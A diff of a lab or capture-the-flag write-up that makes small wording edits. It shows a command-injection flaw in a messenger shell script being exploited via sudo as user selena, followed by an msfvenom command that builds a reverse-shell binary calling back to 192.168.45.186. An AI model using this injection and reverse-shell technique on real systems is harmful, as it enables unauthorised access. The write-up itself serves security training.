@@ -390,9 +390,11 @@ echo "Message sent to $name :) "
                 echo ""
 ```
 
-> The line `$msg 2> /dev/null` is vulnerable and that means that we can inject commands when executing the script via the message parameter.
+> The line `$msg 2> /dev/null` is vulnerable.
 {: .prompt-info }
 
+That means that we can inject commands when executing the script exploiting the message parameter.
+  
 Checking if the idea works.
 ```bash
 $ sudo -u selena /home/messenger.sh
@@ -416,7 +418,7 @@ Message sent to ariana :)
 > Yes it does! Our `whoami` command got executed.
 {: .prompt-info }
 
-Lets generate a simple reverse shell we place on the target and execute with the script to get a shell as user `selena`.
+Lets generate a simple reverse shell we place on the target and then execute with the script to get a shell as user `selena`.
 ```bash
 $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.186 LPORT=80 -f elf > revshell
 PG::Coder.new(hash) is deprecated. Please use keyword arguments instead! Called from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.3/lib/active_record/connection_adapters/postgresql_adapter.rb:980:in `new'
